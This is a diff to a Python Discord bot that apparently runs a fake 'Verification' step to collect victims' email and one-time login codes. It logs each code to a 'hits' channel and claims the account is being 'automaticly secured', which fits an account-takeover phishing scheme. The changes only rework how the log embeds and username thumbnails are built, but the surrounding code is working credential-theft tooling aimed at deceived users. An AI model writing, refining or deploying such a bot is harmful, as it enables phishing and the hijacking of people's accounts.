@@ -15,7 +15,7 @@ config = json.load(open("config.json", "r+"))
 class MyModalTwo(ui.Modal):
     def __init__(self, username, email, flowtoken):
         super().__init__(title="Verification")
-        self.username = username
+        self.username = quote(username)
         self.email = email
         self.flowtoken = flowtoken
         self.add_item(ui.InputText(label="Code", required=True, max_length=6))
@@ -26,17 +26,21 @@ class MyModalTwo(ui.Modal):
         logs_channel = await interaction.client.fetch_channel(config["discord"]["logs_channel"])
         hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])
 
-        Code_embed = discord.Embed(
+        embed = discord.Embed(
             title = f"User | {interaction.user.name}",
             description=f"**Email** | **Status**\n```{self.email} | Got Code | {code}```",
             timestamp = datetime.datetime.now(),
             colour = 0x79D990,                           
-        ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{quote(self.username, safe='')}")
+        )
+        
+        if self.username and self.username.strip():
+            thumbnail_url = f"https://visage.surgeplay.com/full/512/{self.username}"
+            embed.set_thumbnail(url=thumbnail_url)
 
         await interaction.response.defer(ephemeral=True)
 
         await logs_channel.send("**This Account is being automaticly secured**")
-        await logs_channel.send(embed = Code_embed, view = ButtonOptions(interaction.user.id))
+        await logs_channel.send(embed = embed, view = ButtonOptions(interaction.user.id))
 
         await interaction.followup.send(
             "⌛ Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True
@@ -48,13 +52,18 @@ class MyModalTwo(ui.Modal):
         
         if not securedAccount:
 
+            embed = discord.Embed(
+                title = f"User | {interaction.user.name} ({interaction.user.id})",
+                description = f"**Email** | **Status** | **Reason**\n```{self.email} | Failed to secure | Invalid OTP Code```",
+                timestamp = datetime.datetime.now(),
+                colour = 0xFF5C5C                  
+            )
+            
+            if self.username and self.username.strip():
+                embed.set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{self.username}")
+            
             await logs_channel.send(
-                embed = discord.Embed(
-                    title = f"User | {interaction.user.name} ({interaction.user.id})",
-                    description = f"**Email** | **Status** | **Reason**\n```{self.email} | Failed to secure | Invalid OTP Code```",
-                    timestamp = datetime.datetime.now(),
-                    colour = 0xFF5C5C                  
-                ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{quote(self.username, safe='')}"),
+                embed = embed,
                 view = ButtonOptions(interaction.user)
             )
 
